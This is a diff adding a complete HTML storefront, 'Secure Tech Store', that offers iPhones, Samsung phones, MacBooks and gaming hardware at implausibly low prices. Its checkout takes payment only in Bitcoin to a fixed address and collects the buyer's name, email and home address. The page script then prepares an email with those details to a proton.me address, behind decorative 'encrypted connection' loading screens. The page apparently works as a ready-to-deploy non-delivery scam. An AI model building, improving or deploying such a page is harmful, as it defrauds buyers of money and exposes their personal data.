@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SECURE TECH STORE</title>
+    <style>
+        :root {
+            --bg-color: #0d1117;
+            --box-bg: #161b22;
+            --border-color: #30363d;
+            --text-primary: #c9d1d9;
+            --text-secondary: #8b949e;
+            --accent-green: #2ea043;
+            --accent-hover: #238636;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: var(--bg-color);
+            color: var(--text-primary);
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+        /* --- LOADER OVERLAY --- */
+        #loader-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(13, 17, 23, 0.95);
+            z-index: 9999;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid var(--border-color);
+            border-top: 4px solid var(--accent-green);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        #loader-text {
+            color: var(--accent-green);
+            font-size: 1.2rem;
+            font-weight: bold;
+            letter-spacing: 2px;
+            animation: pulse 1.5s infinite;
+            text-align: center;
+            padding: 0 20px;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        /* --- STORE VIEW --- */
+        #store-view {
+            display: block;
+        }
+
+        header {
+            background-color: var(--box-bg);
+            border-bottom: 1px solid var(--border-color);
+            padding: 20px;
+            text-align: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        h1 {
+            margin: 0 0 15px 0;
+            font-size: 2rem;
+            color: #fff;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        .category-nav {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .category-btn {
+            background-color: transparent;
+            color: var(--text-secondary);
+            border: 1px solid var(--border-color);
+            padding: 8px 16px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-family: inherit;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            font-size: 0.9rem;
+        }
+
+        .category-btn:hover, .category-btn.active {
+            background-color: var(--border-color);
+            color: #fff;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 40px auto;
+            padding: 0 20px;
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 25px;
+        }
+
+        .product-card {
+            background-color: var(--box-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .product-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.6);
+            border-color: var(--text-secondary);
+        }
+
+        .product-image {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            border-bottom: 1px solid var(--border-color);
+            background-color: #fff; /* Added in case transparent images are used */
+        }
+
+        .product-info {
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            flex-grow: 1;
+        }
+
+        .product-title {
+            font-size: 1.2rem;
+            margin: 0 0 10px 0;
+            color: #fff;
+            font-weight: bold;
+        }
+
+        .product-price {
+            font-size: 1.4rem;
+            color: var(--accent-green);
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        .buy-btn {
+            margin-top: auto;
+            background-color: var(--accent-green);
+            color: #fff;
+            border: none;
+            padding: 12px;
+            font-size: 1rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            font-family: inherit;
+        }
+
+        .buy-btn:hover {
+            background-color: var(--accent-hover);
+        }
+
+        /* --- CHECKOUT VIEW --- */
+        #checkout-view {
+            display: none;
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 30px;
+            background-color: var(--box-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+        }
+
+        .checkout-header {
+            text-align: center;
+            margin-bottom: 30px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 20px;
+        }
+
+        .checkout-header h2 {
+            color: #fff;
+            margin: 0 0 10px 0;
+        }
+
+        .order-summary {
+            background-color: #010409;
+            padding: 15px;
+            border-radius: 6px;
+            border: 1px dashed var(--border-color);
+            margin-bottom: 25px;
+        }
+
+        .order-summary p {
+            margin: 5px 0;
+            font-size: 1.1rem;
+        }
+
+        .free-shipping {
+            color: var(--accent-green);
+            font-weight: bold;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: var(--text-secondary);
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            font-size: 1rem;
+            background-color: #010409;
+            border: 1px solid var(--border-color);
+            color: #fff;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-family: inherit;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: var(--accent-green);
+            box-shadow: 0 0 5px rgba(46, 160, 67, 0.4);
+        }
+
+        .crypto-payment {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid var(--border-color);
+        }
+
+        .crypto-address {
+            background-color: #000;
+            padding: 10px;
+            color: var(--accent-green);
+            font-weight: bold;
+            word-break: break-all;
+            border-radius: 4px;
+            border: 1px solid var(--border-color);
+            margin: 10px 0;
+        }
+
+        .qr-code {
+            width: 150px;
+            height: 150px;
+            margin: 10px auto;
+            border: 2px solid var(--border-color);
+            border-radius: 8px;
+            display: block;
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 30px;
+        }
+
+        .back-btn {
+            background-color: transparent;
+            color: var(--text-primary);
+            border: 1px solid var(--text-secondary);
+            flex: 1;
+        }
+
+        .back-btn:hover {
+            background-color: var(--border-color);
+        }
+
+        .proceed-btn {
+            flex: 2;
+        }
+
+        footer {
+            text-align: center;
+            padding: 20px;
+            color: var(--text-secondary);
+            border-top: 1px solid var(--border-color);
+            margin-top: 40px;
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="loader-overlay">
+        <div class="spinner"></div>
+        <div id="loader-text">PROCESSING ENCRYPTED ORDER...</div>
+    </div>
+
+    <div id="store-view">
+        <header>
+            <h1>SECURE TECH STORE</h1>
+            <div class="category-nav">
+                <button class="category-btn active" onclick="filterCategory('all')">ALL</button>
+                <button class="category-btn" onclick="filterCategory('iphone')">IPHONE</button>
+                <button class="category-btn" onclick="filterCategory('samsung')">SAMSUNG</button>
+                <button class="category-btn" onclick="filterCategory('macos')">MAC OS</button>
+                <button class="category-btn" onclick="filterCategory('predator')">PREDATOR</button>
+                <button class="category-btn" onclick="filterCategory('alienware')">ALIENWARE</button>
+                <button class="category-btn" onclick="filterCategory('ps5')">PS5</button>
+            </div>
+        </header>
+
+        <main class="container" id="product-grid">
+            </main>
+    </div>
+
+    <div id="checkout-view">
+        <div class="checkout-header">
+            <h2>SECURE CHECKOUT</h2>
+            <p>Encrypted P2P Connection</p>
+        </div>
+
+        <div class="order-summary">
+            <p><strong>Product:</strong> <span id="checkout-product-name">...</span></p>
+            <p><strong>Total Price:</strong> <span id="checkout-product-price" style="color: #fff;">...</span></p>
+            <p><strong>Shipping:</strong> <span class="free-shipping">FREE DELIVERY</span></p>
+        </div>
+
+        <form id="checkout-form" onsubmit="processOrder(event)">
+            <div class="form-group">
+                <label>Full Name</label>
+                <input type="text" id="buyer-name" required placeholder="Enter your name">
+            </div>
+            <div class="form-group">
+                <label>Email Address</label>
+                <input type="email" id="buyer-email" required placeholder="your.email@example.com">
+            </div>
+            <div class="form-group">
+                <label>Street Address</label>
+                <input type="text" id="buyer-street" required placeholder="123 Secure Ave, Apt 4">
+            </div>
+            <div class="form-group">
+                <label>Zip Code</label>
+                <input type="text" id="buyer-zip" required placeholder="00000-000">
+            </div>
+
+            <div class="crypto-payment">
+                <p>To finalize your order, send exactly <strong id="crypto-amount" style="color: var(--accent-green);"></strong> to the Bitcoin address below:</p>
+                
+                <a href="https://ibb.co/zhKJNT5r" target="_blank">
+                    <img src="https://i.ibb.co/xSVH3tsD/Screenshot-20260426-160254.jpg" alt="Bitcoin QR Code" class="qr-code" border="0">
+                </a>
+                
+                <div class="crypto-address">bc1qj6fx2dqrxqx4u8euurygs5xpw4yyuyvg64vx6p</div>
+                <p style="font-size: 0.8rem; color: var(--text-secondary);">Your order will be processed automatically once the transaction is confirmed on the blockchain.</p>
+            </div>
+
+            <div class="action-buttons">
+                <button type="button" class="buy-btn back-btn" onclick="cancelCheckout()">CANCEL</button>
+                <button type="submit" class="buy-btn proceed-btn">PROCEED ORDER</button>
+            </div>
+        </form>
+    </div>
+
+    <footer>
+        &copy; 2026 Secure Tech Store. Decentralized & Encrypted.
+    </footer>
+
+    <script>
+        // Updated products list including iPhones 12 to 16
+        const products = [
+            { id: 1, name: "Apple iPhone 16", price: 498, category: "iphone", img: "https://i.ibb.co/8DbW9G7L/download.webp" },
+            { id: 2, name: "Apple iPhone 15", price: 480, category: "iphone", img: "https://images.unsplash.com/photo-1592750475338-74b7b21085ab?auto=format&fit=crop&w=500&q=80" },
+            { id: 3, name: "Apple iPhone 14", price: 450, category: "iphone", img: "https://i.ibb.co/ycFzLhTQ/0-3a8ee275-f256-430f-ba26-60bfa7851bb7-jpeg.webp" },
+            { id: 4, name: "Apple iPhone 13", price: 240, category: "iphone", img: "https://images.unsplash.com/photo-1632661674596-df8be070a5c5?auto=format&fit=crop&w=500&q=80" },
+            { id: 5, name: "Apple iPhone 12", price: 150, category: "iphone", img: "https://images.unsplash.com/photo-1605236453806-6ff36851218e?auto=format&fit=crop&w=500&q=80" },
+            { id: 6, name: "Apple iPhone 11", price: 50, category: "iphone", img: "https://i.ibb.co/0yr612jg/7739a3f23c809ed10189456c516cd8c1.jpg" },
+            { id: 7, name: "Samsung Galaxy S21 Ultra", price: 100, category: "samsung", img: "https://i.ibb.co/V0Zx9D1g/galaxy-s21-ultra-4.jpg" },
+            { id: 8, name: "Samsung Galaxy S22", price: 100, category: "samsung", img: "https://i.ibb.co/SXyBwpsd/s-l960.webp" },
+            { id: 9, name: "Samsung Galaxy S25 Plus", price: 250, category: "samsung", img: "https://i.ibb.co/4Lqr42L/271779-400-auto.png" },
+            { id: 10, name: "Samsung Galaxy S24", price: 200, category: "samsung", img: "https://i.ibb.co/YBTPbrTM/357046.png" },
+            { id: 11, name: "Samsung Galaxy S23 Ultra", price: 200, category: "samsung", img: "https://i.ibb.co/TGcpW9J/51r-PU0j-Dc0-L-AC-SX679.jpg" },
+            { id: 12, name: "Alienware Gaming Laptop", price: 1000, category: "alienware", img: "https://i.ibb.co/9kDBYdQj/laptop-alienware-aa16250nt-mb2-gallery-5.avif" },
+            { id: 13, name: "Acer Predator Gaming PC", price: 1000, category: "predator", img: "https://i.ibb.co/LXmN1tTM/acer-predator-helios-300-spatiallabs-1536x987.jpg" },
+            { id: 14, name: "MacBook Pro M3", price: 1000, category: "macos", img: "https://i.ibb.co/v64fhXnV/csm-IMG-1241-772bbde126.jpg" },
+            { id: 15, name: "PlayStation 5 Console", price: 250, category: "ps5", img: "https://images.unsplash.com/photo-1606813907291-d86efa9b94db?auto=format&fit=crop&w=500&q=80" }
+        ];
+
+        const grid = document.getElementById('product-grid');
+        const storeView = document.getElementById('store-view');
+        const checkoutView = document.getElementById('checkout-view');
+        const loaderOverlay = document.getElementById('loader-overlay');
+        const loaderText = document.getElementById('loader-text');
+
+        // Render products
+        function renderProducts(filter = 'all') {
+            grid.innerHTML = ''; 
+
+            const filteredProducts = filter === 'all' 
+                ? products 
+                : products.filter(p => p.category === filter);
+
+            filteredProducts.forEach(product => {
+                const card = document.createElement('div');
+                card.className = 'product-card';
+                card.innerHTML = `
+                    <img src="${product.img}" alt="${product.name}" class="product-image">
+                    <div class="product-info">
+                        <h2 class="product-title">${product.name}</h2>
+                        <div class="product-price">$ ${product.price}</div>
+                        <button class="buy-btn" onclick="openCheckout(${product.id})">BUY NOW</button>
+                    </div>
+                `;
+                grid.appendChild(card);
+            });
+        }
+
+        // Filter Categories
+        function filterCategory(category) {
+            const buttons = document.querySelectorAll('.category-btn');
+            buttons.forEach(btn => btn.classList.remove('active'));
+            event.target.classList.add('active');
+            renderProducts(category);
+        }
+
+        // Handle opening the checkout page (With "Antes" Animation)
+        function openCheckout(productId) {
+            const product = products.find(p => p.id === productId);
+            if (!product) return;
+
+            // Populate checkout details
+            document.getElementById('checkout-product-name').textContent = product.name;
+            document.getElementById('checkout-product-price').textContent = `$ ${product.price}`;
+            document.getElementById('crypto-amount').textContent = `$ ${product.price} in BTC`;
+
+            // Clear inputs
+            document.getElementById('buyer-name').value = '';
+            document.getElementById('buyer-email').value = '';
+            document.getElementById('buyer-street').value = '';
+            document.getElementById('buyer-zip').value = '';
+
+            // 1. Show Loading Animation (Antes do checkout)
+            loaderText.textContent = "ESTABLISHING SECURE CONNECTION...";
+            loaderOverlay.style.display = "flex";
+            
+            // Hide store behind the overlay
+            storeView.style.display = 'none';
+
+            // Simulate loading time before showing checkout
+            setTimeout(() => {
+                loaderOverlay.style.display = "none";
+                checkoutView.style.display = 'block';
+                window.scrollTo(0, 0);
+            }, 1200);
+        }
+
+        // Handle canceling checkout
+        function cancelCheckout() {
+            checkoutView.style.display = 'none';
+            storeView.style.display = 'block';
+            window.scrollTo(0, 0);
+        }
+
+        // Handle final order submission (With "Depois" Animation)
+        function processOrder(event) {
+            event.preventDefault(); // Prevents page reload
+            
+            // Get values from inputs
+            const name = document.getElementById('buyer-name').value;
+            const email = document.getElementById('buyer-email').value;
+            const street = document.getElementById('buyer-street').value;
+            const zip = document.getElementById('buyer-zip').value;
+            const product = document.getElementById('checkout-product-name').textContent;
+            const price = document.getElementById('crypto-amount').textContent;
+
+            // 2. Show Loading Animation (Depois do checkout)
+            loaderText.textContent = "PROCESSING ENCRYPTED ORDER...";
+            loaderOverlay.style.display = "flex";
+
+            // Prepare the email details
+            const emailSubject = encodeURIComponent("Product dispatch pending payment");
+            
+            // Added buyer email directly into the body to ensure the recipient has the contact info
+            const emailBodyText = `Awaiting payment to dispatch the product: ${product}
+
+Buyer Name: ${name}
+Buyer Email: ${email}
+Delivery Address: ${street}
+Zip Code: ${zip}
+
+Please send exactly ${price} to the Bitcoin address below:
+bc1qj6fx2dqrxqx4u8euurygs5xpw4yyuyvg64vx6p
+
+Scan the QR Code here: https://ibb.co/zhKJNT5r
+
+Your order will be processed automatically once the transaction is confirmed.`;
+
+            // Changed destination to cryptome0800@proton.me
+            const mailtoLink = `mailto:cryptome0800@proton.me?subject=${emailSubject}&body=${encodeURIComponent(emailBodyText)}`;
+
+            // Simulate processing time, then open email and update UI
+            setTimeout(() => {
+                loaderText.textContent = "REDIRECTING TO EMAIL CLIENT...";
+                
+                setTimeout(() => {
+                    // Open the email client
+                    window.location.href = mailtoLink;
+                    
+                    // Hide loader and return to store
+                    loaderOverlay.style.display = "none";
+                    cancelCheckout();
+                }, 1500);
+
+            }, 2500);
+        }
+
+        // Initial render
+        window.onload = () => {
+            renderProducts('all');
+        };
+    </script>
+</body>
+</html>
